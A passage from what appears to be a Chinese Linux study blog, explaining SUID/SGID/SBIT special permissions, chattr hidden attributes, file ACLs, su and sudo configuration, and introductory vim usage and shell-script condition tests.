SGID与SBIT的特殊权限位.这是一种对文件权限进行设置的特殊功能,可以与一般的权限同时使用,以弥补一般权限不能使用</p><h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><p>SUID是一种对二进制程序进行设置的特殊权限,能够让二进制程序的执行者临时拥有所有者的权限(仅对拥有执行权限的二进制程序有效).例如所有用户都可以执行passwd命令来修改自己的用户密码,而用户密码保存在&#x2F;etc&#x2F;shadow文件中,仔细看这个文件就会发现它的默认权限是000,也就是说除了root管理员以外,所有用户都没有查看或者编辑该文件的权限.但是在使用passwd命令时如果加上SUID特殊权限,既可以让普通用户临时获得程序所有者的身份,把变更的密码信息写入到shadow文件件中.</p><p>查看passwd命令属性时发现所有者的权限有rwx变成了rws,其中x改变成s就意味着该文件被赋予了SUID权限,如果原先权限位置上没有可执行权限x,那么被赋予特殊权限之后将变成大写的S</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231951191.png" alt="image-20220323195110150"></p><p>一定要小心这个权限,因为一点某个命令文件被设置了SUID权限,就意味着凡是执行该文件的人都临时获取到文件所有者所对应的最高权限,因此不要将SUID权限设置到vim cat rm 等命令上面</p><h4 id="SGID"><a href="#SGID" class="headerlink" title="SGID"></a>SGID</h4><p>SGID特殊权限有两种应用场景:当对二进制程序进行设置时,能够让执行者临时获取文件所属组的权限;当对目录进行设置时,则是让目录内新建的文件自动继承该目录原有用户组的名称</p><p>SGID的第一种功能就是参考SUID而设计的,不同点在于执行程序的用户获取的不再是文件所有者的临时权限,而是获取到文件所属组的权限,在早起的linux系统中,&#x2F;dev&#x2F;kmem是一个字符设备文件,用于存储内核程序要访问的数据权限为</p><pre><code>cr--r-----   1 root system 2,  1 Feb 11 2017  kmem</code></pre><p>除了root管理员或属于system组的成员之外,所有用户都没有读取该文件的权限,由于在欧宁市需要查看系统的进程状态,为了能够获取进程的状态信息,可在用于查看系统进程状态的ps命令上增加SGID特殊权限位</p><pre><code>-r-xr-sr-x   1 bin system 59346 Feb 11 2017  ps</code></pre><p>这样一来由于ps命令被增加了SGID特殊权限位,所以当用户执行该命令时,也就临时获得了system用户组的权限,从而顺利的读取到了设备文件</p><p>每个文件都有其归属的所有者和所属组,当创建或者传送一个文件后,这个文件就会自动归属于执行这个操作的用户(即该用户时文件的所有者) 如果现在需要在一个部门内设置共享目录,让部门内的所有人员都能读取目录中的内容,那么就可以在穿件不能共享目录之后,在该目录上设置SGID特殊权限位,这样,部门内的任何人员在里面创建的任何文件都会归属该目录的所属组,而不在是自己的基本用户组.此时用到的是SGID的第二个功能,即在某个目录中创建的文件会自动继承该目录的用户组</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232039940.png" alt="image-20220323203950890"></p><p>在使用上述命令设置好目录的777权限之后确保普通用户可以向其中写入文件,并为该目录设置了SGID特殊权限位后,就可以切换至一个普通用户,然后尝试在该目录中创建文件,并查看新创建的文件是否会继承新创建的文件所在的目录的所属组名称</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232043188.png" alt="image-20220323204301150"></p><p>除了上面提到的SGID的这两个功能,在介绍 chmod 和chown</p><p>chmod命令用于设置文件的一般权限及特殊属性权限, change mode </p><pre><code>chmod [参数] 文件名</code></pre><p>这是一个与文件权限的日常设置强相关的命令 想要把一个文件的权限设置成其所有者可读可写可执行 所属组可读 可写 其他人没有任何权限,则相应的字符表示法表示rwxrw—-,其数字法表示为760</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232047154.png" alt="image-20220323204722114"></p><p>chmod命令用于设置文件的所有者和所属组,英文 change own </p><pre><code>chown 所有者:所有组 文件名</code></pre><p>chmod和chown命令时用于修改文件属性和权限的最常用命令,他们还有一个特别的共性,就是针对目录进行操作时需要加上大写参数-R来表示递归操作,即对目录内的所有文件进行整体操作</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232050592.png" alt="image-20220323205047552"></p><h4 id="SBIT"><a href="#SBIT" class="headerlink" title="SBIT"></a>SBIT</h4><p>SBIT特殊权限位可确保用户只能删除自己的文件,而不能删除其他用户的文件.当对某个目录设置了SBIT粘滞位权限后,那么该目录中的文件就只能被其所有者执行删除操作了</p><p>与前面的SUID与SGID权限显示方法不同,当目录被设置了SBIT特殊权限位之后,文件的其他用户权限部分的x执行权限就会被替换成t或者T 原本有x执行权限则会写成t,原本没有x执行权限就会被写成T</p><p>&#x2F;tmp目录上的SBIT权限默认已经存在,这体现为其他用户权限字段的权限变为rwt</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232056106.png" alt="image-20220323205626063"></p><p>其实文件能否被删除并不取决于自身的权限,而是看其所在的目录是否有写入权限</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232058887.png" alt="image-20220323205835849"></p><p>随后切换到一个普通用户身份下,尝试删除这个由其他人创建的文件,这时就会发现,即便读 写 执行权限全开,但是由于SBIT特殊权限位的缘故,依然无法删除该文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232100803.png" alt="image-20220323210044764"></p><p>若能善加使用特殊权限，就能实现很多巧妙的功能</p><p>  SUID、SGID、SBIT特殊权限的设置参数</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>u+s</td><td>设置SUID权限</td></tr><tr><td>u-s</td><td>取消SUID权限</td></tr><tr><td>g+s</td><td>设置SGID权限</td></tr><tr><td>g-s</td><td>取消SGID权限</td></tr><tr><td>o+t</td><td>设置SBIT权限</td></tr><tr><td>o-t</td><td>取消SBIT权限</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232240906.png" alt="image-20220323224011863"></p><p>上述的代码中o+t参数是在一般权限已经设置了完毕的前提下,又新增了意向特殊权限,如果我们像将一般的权限和特殊权限一起设置,</p><p>其实SUID SGID SBIT也有对应的数字表示法,分别表示为4 2 1 也就是说777还不是最大的权限,最大的权限应该是7777,其中第一个数字代表的是特殊位置权限.</p><p>在rwxr-xr-t权限中,最后一位是t,这说明了该文件的一般权限是rwxr-xr-x,并带有SBIT特殊权限,-rwxr-xr-x即为755,而SBIT特殊权限位是1,则合并之后的结果为1755</p><p>如果权限是rwsrwSr–呢 大写的S表示原本没有执行全心,因此一般权限为rwxrw-r–,将其转换为数字表示法后的结果是764.带有SUID和SGID特殊权限的数字法表示是4和2,所以结果就是6,合并之后就是6764.</p><p>将权限的数字表示法转换成字符表示法的难度有点高,这里以5537为例.首先特殊权限5是有4+1组合成的,意味着有SUID和SBIT.SUID和SBIT的写法是,原先有执行权限则是小写s如果没有执行权限则是大写的S;而SBIT的写法则是,原先有执行权限是小写t,没有执行权限是大写的T.一般权限的537进行字符转换后应该为r-x-wxrwx,然后再此基础上增加SUID和SBIT特殊权限,合并后的结果是r-s-wxrwt</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232250971.png" alt="image-20220323225005921"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232250984.png" alt="image-20220323225013936"></p><h3 id="文件的隐藏属性"><a href="#文件的隐藏属性" class="headerlink" title="文件的隐藏属性"></a>文件的隐藏属性</h3><p>隐藏权限的专用设置命令时chattr,专用查看命令是lsattr</p><h4 id="chattr命令"><a href="#chattr命令" class="headerlink" title="chattr命令"></a>chattr命令</h4><p>chattr命令用于设置文件的隐藏属性权限, change attributes </p><pre><code>chattr [参数] 文件名称</code></pre><p>如果想要把某个隐藏功能添加到文件上,则需要在命令后面追加”+参数”,如果想要将某个隐藏功能移除文件,则需要追加”-参数”.chattr命令中可供选择的隐藏权限参数非常丰富</p><p> chattr命令中的参数及其作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>i</td><td>无法对文件进行修改；若对目录设置了该参数，则仅能修改其中的子文件内容而不能新建或删除文件</td></tr><tr><td>a</td><td>仅允许补充（追加）内容，无法覆盖&#x2F;删除内容（Append Only）</td></tr><tr><td>S</td><td>文件内容在变更后立即同步到硬盘（sync）</td></tr><tr><td>s</td><td>彻底从硬盘中删除，不可恢复（用0填充原文件所在硬盘区域）</td></tr><tr><td>A</td><td>不再修改这个文件或目录的最后访问时间（atime）</td></tr><tr><td>b</td><td>不再修改文件或目录的存取时间</td></tr><tr><td>D</td><td>检查压缩文件中的错误</td></tr><tr><td>d</td><td>使用dump命令备份时忽略本文件&#x2F;目录</td></tr><tr><td>c</td><td>默认将文件或目录进行压缩</td></tr><tr><td>u</td><td>当删除该文件后依然保留其在硬盘中的数据，方便日后恢复</td></tr><tr><td>t</td><td>让文件系统支持尾部合并（tail-merging）</td></tr><tr><td>x</td><td>可以直接访问压缩文件中的内容</td></tr></tbody></table><p>先来创建一个普通文件，然后立即尝试删除</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240915136.png" alt="image-20220324091458076"></p><p>接下来在创建一个普通文件,将其设置”不允许删除与覆盖”(+a参数)权限,然后再尝试删除</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240917531.png" alt="image-20220324091711487"></p><h4 id="lsattr命令"><a href="#lsattr命令" class="headerlink" title="lsattr命令"></a>lsattr命令</h4><p>lsattr命令用于查看文件的隐藏权限 英文 list attributes 语法</p><pre><code>lsattr [参数] 文件名称</code></pre><p>文件的隐藏权限必须通过lsattr命令来查看</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240920320.png" alt="image-20220324092034283"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240921352.png" alt="image-20220324092116317"></p><p>一帮会将-a参数设置到日志文件中(&#x2F;var&#x2F;logmessages),这样可以在不影响系统正常写入日志的前提下,防止黑客擦除自己的作案证据.如果希望彻底保护某个文件,不允许其他人修改或者删除它的话,可以加上-i参数</p><p>要想彻底删除某个文件,可以使用-s参数来保证其被删除后不可恢复,硬盘上的文件数据会被用零块重新填充</p><h3 id="文件访问控制列表"><a href="#文件访问控制列表" class="headerlink" title="文件访问控制列表"></a>文件访问控制列表</h3><p>如果希望对某个指定的用户进行单独的权限控制,就需要用到文件的访问控制列表了(ACL),基于普通文件或者目录设置ACL其实就是针对特定的用户或用户组设置文件或者目录的操作权限,更加精确的派发权限.如果针对某个目录设置了ACL则目录中的文件会继承其ACL权限,若针对文件设置了ACL,则文件不在继承其所在目录的ACL权限</p><p>先切换到普通用户，然后尝试进入root管理员的家目录中</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240940560.png" alt="image-20220324094030519"></p><h4 id="setfacl命令"><a href="#setfacl命令" class="headerlink" title="setfacl命令"></a>setfacl命令</h4><p>setfacl命令用于管理文件的ACL权限规则 set files ACL</p><pre><code>setfacl [参数] 文件名称</code></pre><p>ACL权限提供的是在所有者 所属组 其他人的读 写 执行权限之外的特殊权限控制.使用setfacl命令可以针对单一用户或用户组 单一文件或目录来进行 读 写 执行权限的控制 其中针对目录文件需要使用 -R 递归参数 针对普通文件则使用-m 参数 如果想要删除某个文件的ACL可以使用-b参数</p><p> setfacl命令中的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-m</td><td>修改权限</td></tr><tr><td>-M</td><td>从文件中读取权限</td></tr><tr><td>-x</td><td>删除某个权限</td></tr><tr><td>-b</td><td>删除全部权限</td></tr><tr><td>-R</td><td>递归子目录</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240945063.png" alt="image-20220324094544019"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240945340.png" alt="image-20220324094551294"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240946640.png" alt="image-20220324094656601"></p><p>常用的ls命令时看不到ACL信息的,但是却可以看到文件权限最后的一个(.)变成了加号(+),这就意味着该文件已经设置了ACL </p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240948391.png" alt="image-20220324094833346"></p><h4 id="getfacl命令"><a href="#getfacl命令" class="headerlink" title="getfacl命令"></a>getfacl命令</h4><p>getfacl命令用于查看文件的ACL权限规则, get files ACL</p><pre><code>getfacl [参数] 文件名称</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240949215.png" alt="image-20220324094949167"></p><p>允许某个组的用户都可以读写&#x2F;etc&#x2F;fstab文件：</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240950533.png" alt="image-20220324095000483"></p><p>要清空所有ACL权限，请用-b参数；要删除某一条指定的权限，就用-x参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240950333.png" alt="image-20220324095014290"></p><p>ACL权限的设置都是立即且永久生效的，不需要再编辑什么配置文件</p><p>在备份&#x2F;home目录上的ACL权限时，可使用-R递归参数，这样不仅能够把目录本身的权限进行备份，还能将里面的文件权限也自动备份.getfacl在备份目录权限时不能使用绝对路径的形式，因此我们需要先切换到最上层根目录，然后再进行操作。</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240951347.png" alt="image-20220324095101305"></p><p>ACL权限的恢复也很简单，使用的是–restore参数。由于在备份时已经指定是对&#x2F;home目录进行操作，所以不需要写对应的目录名称，它能够自动找到要恢复的对象</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240951501.png" alt="image-20220324095116464"></p><h3 id="su命令与sudo服务"><a href="#su命令与sudo服务" class="headerlink" title="su命令与sudo服务"></a>su命令与sudo服务</h3><h4 id="su命令"><a href="#su命令" class="headerlink" title="su命令"></a>su命令</h4><p>su命令可以解决切换用户身份的需求,使得当前用户在不退出登录的情况下,顺利的切换到其他用户</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240953570.png" alt="image-20220324095334523"></p><p>这其中的减号(-),就意味着完全切换到新用户,即把环境变量信息也变更为新用户的响应信息,而不是保留原始信息</p><p>从root管理员切换到普通用户时是不需要验证密码的,而从普通用户切换成root用户就需要进行密码验证了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240956232.png" alt="image-20220324095601190"></p><p>虽然这样使用su命令,普通用户可以完全切换到root管理员用户的身份来进行工作但是这将暴露root管理员的密码</p><h4 id="sudo命令"><a href="#sudo命令" class="headerlink" title="sudo命令"></a>sudo命令</h4><p>sudo命令用于给普通鱼护提供额外的权限</p><pre><code>sudo [参数] 用户名</code></pre><p>使用sudo命令可以给普通用户提供额外的权限来完成只有root用户才能完成的任务,可限制用户执行指定的命令,记录用户执行过的每一条命令,集中管理用户与全心(&#x2F;etc&#x2F;sudoers),以及可以在验证密码后的一段时间内无需让用户再次验证密码</p><p>  sudo命令中的可用参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-h</td><td>列出帮助信息</td></tr><tr><td>-l</td><td>列出当前用户可执行的命令</td></tr><tr><td>-u 用户名或UID值</td><td>以指定的用户身份执行命令</td></tr><tr><td>-k</td><td>清空密码的有效时间，下次执行sudo时需要再次进行密码验证</td></tr><tr><td>-b</td><td>在后台执行指定的命令</td></tr><tr><td>-p</td><td>更改询问密码的提示语</td></tr></tbody></table><h4 id="visudo命令"><a href="#visudo命令" class="headerlink" title="visudo命令"></a>visudo命令</h4><p>visudo命令用于编辑 配置用户sudo的权限文件</p><pre><code>visudo [参数]</code></pre><p>这是一条会自动调用vi编辑器来配置&#x2F;etc&#x2F;sudoers权限文件的命令.能够解决多个用户同时自改权限而导致的冲突问题.visudo命令还可以对配置文件内的参数进行语法检查,并在发现参数错误时进行报错提醒.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241004757.png" alt="image-20220324100435706"></p><p>使用visudo命令配置权限文件的时候.其操作方法和vim编辑器中用到的方法完全一致因此在编写完成后记得在末行模式下保存并退出。在配置权限文件时，按照下面的格式在第101行（大约）填写上指定的信息</p><pre><code>谁可以使用 允许使用的主机 = （以谁的身份） 可执行命令的列表谁可以使用：稍后要为哪位用户进行命令授权。允许使用的主机：可以填写ALL表示不限制来源的主机，亦可填写如192.168.10.0/24这样的网段限制来源地址，使得只有从允许网段登录时才能使用sudo命令。以谁的身份：可以填写ALL表示系统最高权限，也可以是另外一位用户的名字。可执行命令的列表：可以填写ALL表示不限制命令，亦可填写如/usr/bin/cat这样的文件名称来限制命令列表，多个命令文件之间用逗号（,）间隔。</code></pre><p>在Linux系统中配置服务文件时，虽然没有硬性规定，但从经验来讲新增参数的位置不建议太靠上，以免我们新填写的参数在执行时失败，导致一些必要的服务功能没有成功加载。一般建议在配置文件中找一下相似的参数，然后在相邻位置进行新的修改，或者在文件的中下部位置进行添加后修改</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241006086.png" alt="image-20220324100615041"></p><p>在填写完毕后记得要先保存再退出，然后切换至指定的普通用户身份，此时就可以用sudo -l命令查看所有可执行的命令了（在下面的命令中，验证的是普通用户的密码，而不是root管理员的密码)</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241006032.png" alt="image-20220324100630970"></p><p>作为一名普通用户，是肯定不能看到root管理员的家目录（&#x2F;root）中的文件信息的，但是，只需要在想执行的命令前面加上sudo命令就行了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241007640.png" alt="image-20220324100708591"></p><p>每次执行sudo命令后都会要求验证一下密码。虽然这个密码就是当前登录用户的密码，但是每次执行sudo命令都要输入一次密码其实也挺麻烦的，这时可以添加NOPASSWD参数，使得用户下次再执行sudo命令时就不用密码验证</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241007780.png" alt="image-20220324100756732"></p><p>这样，当切换到普通用户后再执行命令时，就不用再频繁地验证密码了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241008670.png" alt="image-20220324100808623"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习(三)</title>
      <link href="/Linux/Linux/Linux-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E4%B8%89)/"/>
      <url>/Linux/Linux/Linux-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E4%B8%89)/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux学习-三"><a href="#Linux学习-三" class="headerlink" title="Linux学习(三)"></a>Linux学习(三)</h1><h2 id="vim编辑器与shell脚本"><a href="#vim编辑器与shell脚本" class="headerlink" title="vim编辑器与shell脚本"></a>vim编辑器与shell脚本</h2><h3 id="vim文本编辑器"><a href="#vim文本编辑器" class="headerlink" title="vim文本编辑器"></a>vim文本编辑器</h3><p>在linux系统中一切都是文件,而配置一个服务就是在修改其配置文件的参数 </p><p>vim编辑器中设置了三种模式 命令模式 末行模式 编辑模式,每种模式分别又支持多种不同的命令快捷键,这大大提高了工作效率.而且在用户习惯之后会感觉相当顺手.</p><ul><li>命令模式:控制光标移动,可以对文本进行复制 粘贴 删除和查找等工作</li><li>输入模式:正常的文本录入</li><li>末行模式:保存和退出文档,以及设置编辑环境</li></ul><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221858732.png" alt="image-20220322185811678"></p><p>每次运行vim编辑器时默认进入命令模式,此时需要切换到输入模式后再进行文档的编辑工作.而每次在编写完文档后需要先返回命令模式,然后再进入末行模式,执行文档的保存或者退出操作.在vim中,无法直接从输入模式切换到末行模式,vim编辑器中内置的命令有成百上千种用法</p><p>命令模式中最常用的一些命令</p><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>dd</td><td>删除（剪切）光标所在整行</td></tr><tr><td>5dd</td><td>删除（剪切）从光标处开始的5行</td></tr><tr><td>yy</td><td>复制光标所在整行</td></tr><tr><td>5yy</td><td>复制从光标处开始的5行</td></tr><tr><td>n</td><td>显示搜索命令定位到的下一个字符串</td></tr><tr><td>N</td><td>显示搜索命令定位到的上一个字符串</td></tr><tr><td>u</td><td>撤销上一步的操作</td></tr><tr><td>p</td><td>将之前删除（dd）或复制（yy）过的数据粘贴到光标后面</td></tr></tbody></table><p>末行模式主要用于保存或退出文件,以及设置vim编辑器的工作环境,还可以让用户执行外部的linux命令或跳转到所编写文档的特定行数,像要切换到末行模式,在命令模式中输入一个冒号就可以了</p><p>末行模式中最常用的一些命令</p><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>:w</td><td>保存</td></tr><tr><td>:q</td><td>退出</td></tr><tr><td>:q!</td><td>强制退出（放弃对文档的修改内容）</td></tr><tr><td>:wq!</td><td>强制保存退出</td></tr><tr><td>:set nu</td><td>显示行号</td></tr><tr><td>:set nonu</td><td>不显示行号</td></tr><tr><td>:命令</td><td>执行该命令</td></tr><tr><td>:整数</td><td>跳转到该行</td></tr><tr><td>:s&#x2F;one&#x2F;two</td><td>将当前光标所在行的第一个one替换成two</td></tr><tr><td>:s&#x2F;one&#x2F;two&#x2F;g</td><td>将当前光标所在行的所有one替换成two</td></tr><tr><td>:%s&#x2F;one&#x2F;two&#x2F;g</td><td>将全文中的所有one替换成two</td></tr><tr><td>?字符串</td><td>在文本中从下至上搜索该字符串</td></tr><tr><td>&#x2F;字符串</td><td>在文本中从上至下搜索该字符串</td></tr></tbody></table><h3 id="用vim编写简单文档"><a href="#用vim编写简单文档" class="headerlink" title="用vim编写简单文档"></a>用vim编写简单文档</h3><p>我的系统没有先下一个</p><pre><code>sudo yum install -y vim</code></pre><p>如果存在该文档,则是打开它,如果不存在,则是创建一个临时输入文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221923298.png" alt="image-20220322192350259"></p><p>打开之后默认进入的是vim编辑器的命令模式,此时只能执行该模式下的命令,而不能随意输入文本内容,我们需要切换到输入模式才可以编写该文档</p><p>可以分别使用 a i o 三个键从命令模式切换到输入模式,其中a键与i键分别是在光标后面一位和光标当前位置切换到输入模式,而o键则是在光标下面在创建一个空行,此时可以敲击a键进入到编辑器的输入模式</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221927790.png" alt="image-20220322192713731"></p><p>进入到输入模式后,可以随意输入文本内容,vim编辑器不会把您输入的文本内容当做命令而执行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221928554.png" alt="image-20220322192816517"></p><p>在编写完成之后,想要保存并退出,必须先敲击键盘上的esc键从输入模式返回命令模式,再输入”wq!”切换到末行模式才能完成保存并退出的操作</p><p>当在末行模式中输入”:wq!”命令时,就意味着强制保存并退出文档,然后就可以使用cat命令查看该文档的内容了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203221931938.png" alt="image-20220322193137900"></p><p>继续编辑这个文件,因为要在原有文本内容下面追加内容,所以在命令模式中敲击o键进入模式更高效</p><h3 id="编写shell脚本"><a href="#编写shell脚本" class="headerlink" title="编写shell脚本"></a>编写shell脚本</h3><p>可以将shell终端解释器当成是人与计算机硬件之间的翻译官,它作为用户和系统内部的通讯媒介,除了能够使用支持各种变量与参数,还提供了诸如循环 分支等高级变成语言才有的控制结构特性.想要正确使用shell中的这些功能特性,准确下达命令尤为中要,shell脚本命令的工作方式有下面两种.</p><ul><li>交互式(interactive):用户每输入一条命令就立即执行</li><li>批处理(batch):由用户事先编写好的一个完整的shell脚本,shell会一次性执行脚本中诸多的命令</li></ul><p>在shell脚本中不仅会用到之前的linux命令以及正则表达式 管道符 数据流重定向等语法规则,还需要把内部功能模块化后通过逻辑语句进行处理,最终形成日常所见的shell脚本</p><p>通过查看shell变量可以发现,当前系统已经默认使用bash作为命令行终端解释器了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222013584.png" alt="image-20220322201356549"></p><h4 id="编写简单的脚本"><a href="#编写简单的脚本" class="headerlink" title="编写简单的脚本"></a>编写简单的脚本</h4><p>如果想查看当前所在工作路径并列出当前目录下所有的文件及属性信息,实现这个功能的脚本应该类似于下面这样</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222019409.png" alt="image-20220322201953373"></p><p>加上.sh后缀表示是一个脚本文件</p><p>在上面这个wanan.sh脚本中实际上出现了三种不同的元素:第一行的脚本声明(#!)用来告诉系统使用哪一种shell解释器来执行该脚本,第二行的注释信息(#)是对脚本功能和某些命令的介绍信息,使得自己或他人在日后看到这个脚本内容时,可以快速知道该脚本的作用或一些警告信息,第三 四行的可执行语句也就是我们平时执行的linux命令了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222024915.png" alt="image-20220322202427864"></p><h4 id="接收用户的参数"><a href="#接收用户的参数" class="headerlink" title="接收用户的参数"></a>接收用户的参数</h4><p>但是像上面的脚本程序只能执行一些预先定义好的功能,未免太过死板,为了让脚本程序能更好的满足用户的一些实时需求,以便灵活完成工作,必须要让脚本程序能够像之前执行命令时那样,接收用户输入的参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222027690.png" alt="image-20220322202722657"></p><p>这就意味着命令不仅需要能够接收用户输入的内容,还要有能力进行判断区别,根据不同的输入调用不同的功能</p><p>其实,linux系统中的shell脚本语言早就考虑到了这些,已经内设了用于接收参数的变量,变量之间使用空格间隔,例如,$0对应的是当前shell脚本程序的名称,$#对应的是总共有几个参数,$*对应的是所有位置的参数值,$?对应的是显示上一次命令的执行返回值,而$1 $2 $3…则分别对应着第n个位置的参数值</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222031316.png" alt="image-20220322203152198"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222034555.png" alt="image-20220322203407520"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222034464.png" alt="image-20220322203438427"></p><h4 id="判断用户的参数"><a href="#判断用户的参数" class="headerlink" title="判断用户的参数"></a>判断用户的参数</h4><p>系统在执行mkdir命令时会判断用户输入的信息,即判断用户指定的文件夹名称是否已经存在,如果存在则提示错误,反之则自动创建.shell脚本中的条件测试语法可以判断表达式是否成立,若条件成立则返回数字0,否则便返回非零值.条件测试语法 执行格式如下,条件表达式两边均应有一个空格</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222038802.png" alt="image-20220322203843765"></p><p>按照测试对象来划分,条件测试语句可以分为4种</p><ul><li>文件测试语句</li><li>逻辑测试语句</li><li>整数值比较语句</li><li>字符串比较语句</li></ul><p>文件测试即使用指定条件来判断文件是否存在或权限是否满足等情况的运算符</p><p>文件测试所用的参数</p><table><thead><tr><th>操作符</th><th>作用</th></tr></thead><tbody><tr><td>-d</td><td>测试文件是否为目录类型</td></tr><tr><td>-e</td><td>测试文件是否存在</td></tr><tr><td>-f</td><td>判断是否为一般文件</td></tr><tr><td>-r</td><td>测试当前用户是否有权限读取</td></tr><tr><td>-w</td><td>测试当前用户是否有权限写入</td></tr><tr><td>-x</td><td>测试当前用户是否有权限执行</td></tr></tbody></table><p>下面使用文件测试语句来判断&#x2F;etc&#x2F;fstab是否为一个目录行文件,然后通过shell解释器的内置$?变量显示上一条命令执行后的返回值.如果返回值是0则目录存在,如果返回值是非零的值,则意味着它不是目录,或者不存在这个目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222043006.png" alt="image-20220322204328968"></p><p>在使用文件测试语句来判断&#x2F;etc&#x2F;fstab是否为一般文件,如果返回值为0,代表文件存在,且为一般文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222044557.png" alt="image-20220322204454524"></p><p>判断和查询一定要敲两次吗</p><p>逻辑语句用于对测试结果进行逻辑分析,根据测试结果可以实现不同的效果,例如在shell终端中逻辑”与”的运算符号是&amp;&amp; 他表示前面的命令执行成功后才会执行它后面的命令,因此可以用来判断&#x2F;dev&#x2F;cdrom文件是否存在,若存在则输出exist字样</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222048693.png" alt="image-20220322204830660"></p><p>除了逻辑与外还有逻辑或,他在linux系统中的运算符为|| 代表当前命令执行失败后才会执行它后面的命令,因此可以用来结合系统环境变量USER来判断当前用户是否非管理员身份</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222053819.png" alt="image-20220322205326783"></p><p>第三种逻辑语句是非,在linux系统中的运算符号是一个叹号(!) 它表示把条件测试中的判断结果取相反值,也就是说,如果原本测试结果是正确的,则将其变成错误的,原本测试错误的结果,则将其变成正确的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203222056411.png" alt="image-20220322205600378"></p><p>叹号应该放在判断语句的前面,代表对整个的测试语句进行取反值的操作,而不应该写成”$USER !&#x3D; root 因为 !&#x3D; 代表的是不等于符号≠,尽管执行效果一样,但缺少了逻辑关系</p><ul><li>&amp;&amp;是逻辑与,只有当前面的语句执行成功的时候才会执行后面的语句</li><li>||是逻辑或,只有当前面的语句执行失败的时候才会执行后面的语句</li><li>!是逻辑非,代表对逻辑测试结果取反值,之前若为正确则变成错误,若为错误则变成正确</li></ul><p>整数比较运算符仅是对数字的操作,不能将数字与字符串 文件等内容一起操作,而且不能像当然的使用日常生活中的等号 大于号 小于号来进行判断,因为等号与复制命令符冲突,大于号和小于号分别与输出重定向命令符合输入重定向命令符冲突,因此一定要使用规范的整数比较运算符来进行操作</p><p> 